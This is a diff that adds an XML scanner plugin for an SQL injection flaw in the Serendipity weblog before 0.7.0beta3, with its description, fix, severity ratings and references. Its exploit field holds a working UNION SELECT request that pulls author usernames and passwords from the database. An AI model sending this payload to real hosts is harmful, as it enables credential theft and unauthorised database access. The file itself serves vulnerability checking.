@@ -1,0 +1,36 @@
+<plugin_id>312</plugin_id>
+<plugin_name>Serendipity prior 0.7.0beta3 SQL injections</plugin_name>
+<plugin_family>CGI</plugin_family>
+<plugin_created_date>2005/01/05</plugin_created_date>
+<plugin_created_name>Marc Ruef</plugin_created_name>
+<plugin_created_email>marc.ruef at computec.ch</plugin_created_email>
+<plugin_created_web>http://www.computec.ch</plugin_created_web>
+<plugin_created_company>computec.ch</plugin_created_company>
+<plugin_version>1.0</plugin_version>
+<plugin_protocol>tcp</plugin_protocol>
+<plugin_port>80</plugin_port>
+<plugin_procedure_exploit>open|send GET /comment.php?serendipity[type]=trackbacks&serendipity[entry_id]=0%20and%200%20union%20select%201,2,3,4,username,password,7,8,9,0,1,2,3%20from%20serendipity_authors%20where%20authorid=1%20/* HTTP/1.0\n\n|sleep|close|pattern_exists HTTP/#.# 200 *0 and 0 union select 1,2,3,4,username,password,7,8,9,0,1,2,3 from serendipity_authors where authorid=1*</plugin_procedure_exploit>
+<plugin_exploit_accuracy>99</plugin_exploit_accuracy>
+<plugin_comment>The NASL script is Copyright (C) 2004 Tenable Network Security</plugin_comment>
+<bug_affected>Serendipity prior 0.7.0beta3</bug_affected>
+<bug_vulnerability_class>SQL Injection</bug_vulnerability_class>
+<bug_description>The remote host is running Serendipity, a weblog written in PHP. The remote version of this software is vulnerable to a SQL injection issue due to a failure of the application to properly sanitize user-supplied URI input. An attacker may exploit this flaw to issue arbitrary statements in the remote database, and therefore bypass authorization or even overwrite arbitrary files on the remote system.</bug_description>
+<bug_solution>Upgrade to Serendipity 0.7.0beta3 or newer.</bug_solution>
+<bug_fixing_time>Approx. 20 minutes</bug_fixing_time>
+<bug_exploit_availability>Yes</bug_exploit_availability>
+<bug_exploit_url>http://www.securityfocus.com/bid/11269/exploit/</bug_exploit_url>
+<bug_remote>Yes</bug_remote>
+<bug_local>Yes</bug_local>
+<bug_severity>High</bug_severity>
+<bug_popularity>6</bug_popularity>
+<bug_simplicity>8</bug_simplicity>
+<bug_impact>8</bug_impact>
+<bug_risk>8</bug_risk>
+<bug_nessus_risk>High</bug_nessus_risk>
+<bug_check_tool>Nessus can check this flaw with the plugin 14842 (Serendipity SQL Injections).</bug_check_tool>
+<source_securityfocus_bid>11269</source_securityfocus_bid>
+<source_nessus_id>14842</source_nessus_id>
+<source_literature>Hacking Exposed: Network Security Secrets & Solutions, Stuart McClure, Joel Scambray and George Kurtz, February 25, 2003, 4th Edition, McGraw-Hill Osborne Media, ISBN 0072227427</source_literature>
+<source_misc>http://www.computec.ch</source_misc>
+
+
